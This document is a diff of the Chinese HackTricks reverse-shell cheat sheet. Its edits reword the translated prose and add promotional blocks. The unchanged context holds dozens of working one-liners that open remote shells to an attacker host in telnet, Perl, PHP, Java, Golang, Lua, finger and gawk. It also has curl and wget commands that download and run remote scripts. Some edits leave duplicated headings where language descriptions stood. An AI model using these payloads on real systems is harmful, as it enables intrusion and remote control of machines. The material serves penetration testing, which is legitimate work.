@@ -8,17 +8,25 @@
 
 * 如果您想看到您的**公司在HackTricks中做广告**或**下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
 * 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
-* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)
+* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品
 * **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或 **关注**我们的**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**。**
 * 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。
 
 </details>
 
+**Try Hard Security Group**
+
+<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+
+{% embed url="https://discord.gg/tryhardsecurity" %}
+
+***
+
 **如果您对这些shell有任何疑问，可以使用** [**https://explainshell.com/**](https://explainshell.com) **进行检查**
 
-## 完整TTY
+## Full TTY
 
-**一旦您获得反向shell**[ **阅读此页面以获取完整TTY**](full-ttys.md)**。**
+**一旦获得反向shell**[ **阅读此页面以获取完整的TTY**](full-ttys.md)**。**
 
 ## Bash | sh
 ```bash
@@ -57,7 +65,7 @@ wget http://<IP attacker>/shell.sh -P /tmp; chmod +x /tmp/shell.sh; /tmp/shell.s
 ```
 ## 正向 Shell
 
-在处理基于 Linux 的 Web 应用中的 **远程代码执行 (RCE)** 漏洞时，通过网络防御措施如 iptables 规则或复杂的数据包过滤机制可能会阻碍反向 shell 的获取。在这种受限制的环境中，一种替代方法是建立一个 PTY（伪终端）shell，以更有效地与受损系统进行交互。
+在处理基于 Linux 的 Web 应用中的 **远程代码执行 (RCE)** 漏洞时，通过反向 shell 可能会受到像 iptables 规则或复杂的数据包过滤机制等网络防御的阻碍。在这种受限制的环境中，一种替代方法是建立一个 PTY（伪终端）shell，以更有效地与受损系统进行交互。
 
 一个推荐的工具是 [toboggan](https://github.com/n3rada/toboggan.git)，它简化了与目标环境的交互。
 
@@ -99,7 +107,7 @@ toboggan -m nix.py -i
 - 您的有效负载的前缀和后缀（如果有的话）
 - 发送有效负载的方式（头部？数据？额外信息？）
 
-然后，您可以**发送命令**，甚至**使用`upgrade`命令**来获得完整的PTY（请注意，管道的读取和写入会有大约1.3秒的延迟）。
+然后，您可以**发送命令**，甚至**使用`upgrade`命令**来获得完整的PTY（请注意，管道的读取和写入存在大约1.3秒的延迟）。
 
 ## Netcat
 ```bash
@@ -117,7 +125,7 @@ bash -c "$(curl -fsSL gsocket.io/x)"
 ```
 ## Telnet
 
-Telnet（Telecommunication Network）是一种用于远程登录的协议。 Telnet客户端将用户的键盘输入发送到Telnet服务器，服务器将响应发送回客户端。 Telnet是一种明文协议，因此不建议在不安全的网络上使用。
+Telnet（Telnet）是一种用于远程登录的协议。 Telnet客户端通过Telnet协议连接到Telnet服务器，允许用户在远程计算机上执行操作。 Telnet协议在未加密的情况下传输数据，因此不建议在不安全的网络上使用。
 ```bash
 telnet <ATTACKER-IP> <PORT> | /bin/sh #Blind
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|telnet <ATTACKER-IP> <PORT> >/tmp/f
@@ -148,7 +156,7 @@ python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socke
 ```
 ## Perl
 
-Perl是一种流行的脚本编程语言，广泛用于系统管理、网络编程和安全测试。Perl脚本通常以.pl为扩展名。Perl在渗透测试中经常用于编写自定义脚本和工具，以执行各种任务，如信息收集、漏洞利用和后渗透阶段的操作。Perl具有强大的文本处理能力和模块化特性，使其成为渗透测试人员的首选工具之一。
+Perl是一种流行的脚本编程语言，广泛用于系统管理、文本处理和网络编程。Perl脚本通常以.pl为扩展名。Perl脚本可以在Linux系统上运行，并且可以通过命令行解释器直接执行。Perl提供了丰富的内置函数和模块，使其成为处理文本数据和执行系统管理任务的强大工具。
 ```bash
 perl -e 'use Socket;$i="<ATTACKER-IP>";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"[IPADDR]:[PORT]");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
@@ -162,7 +170,7 @@ ruby -rsocket -e 'exit if fork;c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.
 ```
 ## PHP
 
-PHP是一种流行的服务器端脚本语言，特别适用于Web开发。
+PHP是一种流行的服务器端脚本语言，通常用于Web开发。
 ```php
 // Using 'exec' is the most common method, but assumes that the file descriptor will be 3.
 // Using this method may lead to instances where the connection reaches out to the listener and then closes.
@@ -175,6 +183,8 @@ php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
 <?php exec("/bin/bash -c 'bash -i >/dev/tcp/10.10.14.8/4444 0>&1'"); ?>
 ```
 ## Java
+
+Java是一种通用编程语言，广泛用于开发各种类型的应用程序。 Java程序可以在各种操作系统上运行，因为它是一种跨平台语言。 Java程序通常在Java虚拟机（JVM）上运行，这使得它们具有良好的可移植性和安全性。 Java也被广泛用于Web开发，企业应用程序和移动应用程序开发。
 ```bash
 r = Runtime.getRuntime()
 p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/ATTACKING-IP/80;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
@@ -182,20 +192,20 @@ p.waitFor()
 ```
 ## Ncat
 
-Ncat is a feature-packed networking utility that reads and writes data across networks from the command line. It supports various protocols and offers many advanced features, making it a powerful tool for network debugging and exploration.
+Ncat是一个强大的网络工具，可以用于连接、侦听、端口转发和数据传输。
 ```bash
 victim> ncat --exec cmd.exe --allow 10.0.0.4 -vnl 4444 --ssl
 attacker> ncat -v 10.0.0.22 4444 --ssl
 ```
 ## Golang
 
-Golang是一种由Google开发的编程语言。
+## Golang
 ```bash
 echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","192.168.0.134:8080");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
 ```
 ## Lua
 
-Lua是一种轻量级、高效的脚本语言，常用于嵌入式系统和游戏开发中。 Lua脚本可以通过解释器执行，也可以编译成字节码运行。 Lua具有简洁的语法和强大的扩展能力，被广泛应用于各种领域。 Lua脚本可以通过调用C函数扩展其功能，使其更加灵活和强大。 Lua的设计目标是提供一种简单、灵活、高效的脚本语言，适用于各种应用场景。
+## Lua
 ```bash
 #Linux
 lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','1234');os.execute('/bin/sh -i <&3 >&3 2>&3');"
@@ -204,7 +214,7 @@ lua5.1 -e 'local host, port = "127.0.0.1", 4444 local socket = require("socket")
 ```
 ## NodeJS
 
-## NodeJS
+NodeJS是一个基于Chrome V8引擎的JavaScript运行环境。
 ```javascript
 (function(){
 var net = require("net"),
@@ -289,9 +299,9 @@ awk 'BEGIN {s = "/inet/tcp/0/<IP>/<PORT>"; while(42) { do{ printf "shell>" |& s;
 ```bash
 while true; do nc -l 79; done
 ```
-将命令写下来，按回车，然后按CTRL+D（停止STDIN）
-
 **受害者**
+
+要发送命令，请将其写下，按Enter，然后按CTRL+D（停止STDIN）
 ```bash
 export X=Connected; while true; do X=`eval $(finger "$X"@<IP> 2> /dev/null')`; sleep 1; done
 
@@ -300,8 +310,6 @@ export X=Connected; while true; do X=`eval $(finger "$X"@<IP> 2> /dev/null | gre
 ## Gawk
 
 ## Gawk
-
-Gawk是一个功能强大的文本处理工具，可以用于处理文本数据、生成报告和提取信息。
 ```bash
 #!/usr/bin/gawk -f
 
@@ -330,7 +338,7 @@ close(Service)
 ```bash
 xterm -display 10.0.0.1:1
 ```
-要捕获反向 shell，您可以使用以下命令（将监听端口设置为 6001）：
+要捕获反向 shell，您可以使用以下命令（将监听端口 6001）：
 ```bash
 # Authorize host
 xhost +targetip
@@ -353,16 +361,22 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 * [https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/](https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/)
 * [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
 
+**Try Hard Security Group**
+
+<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+
+{% embed url="https://discord.gg/tryhardsecurity" %}
+
 <details>
 
-<summary><strong>从零开始学习AWS黑客技术</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-支持HackTricks的其他方式:
+支持HackTricks的其他方式：
 
-* 如果您想在HackTricks中看到您的**公司广告**或**下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
+* 如果您想在HackTricks中看到您的**公司广告**或**下载PDF版本的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
 * 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
 * 探索[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)
-* **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或在**Twitter**上关注我们 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**电报群组**](https://t.me/peass) 或 **关注**我们的**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
 * 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。
 
 </details>
